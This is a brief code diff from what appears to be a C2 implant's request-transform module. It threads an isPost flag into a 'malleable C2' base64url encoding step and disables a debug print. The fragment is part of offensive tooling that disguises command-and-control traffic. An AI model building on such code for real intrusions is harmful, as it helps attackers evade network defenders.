@@ -62,7 +62,7 @@ BOOL TransformInit(TRANSFORM* transform, SIZE_T maxSize)
 }
 
 /* Apply malleable C2 modifications to the web request */
-BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsigned char* reqProfile)
+BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsigned char* reqProfile, bool isPost)
 {
 #define MAX_PARAM 1024
 #define MAX_TEMP 4096
@@ -145,7 +145,7 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
             
             case TRANSFORM_BASE64URL:
             {
-                _dbg("[TRANSFORM_BASE64URL] Applying...");//DEBUG
+                //_dbg("[TRANSFORM_BASE64URL] Applying...");//DEBUG
 
                 outlen = calculate_base64_encoded_size(transformedLength);
                 char* temp_encoded = (char *)LocalAlloc(LPTR, outlen + 1);
@@ -156,7 +156,9 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
                     return FALSE;
                 }
 
-                int status = base64url_encode((const unsigned char *)transform->transformed,  transformedLength, temp_encoded, &outlen);
+
+                int status = base64url_encode((const unsigned char *)transform->transformed,  transformedLength, temp_encoded, &outlen, isPost);
+
                 if (status != 0) {
                     LocalFree(temp_encoded);
                     return FALSE;
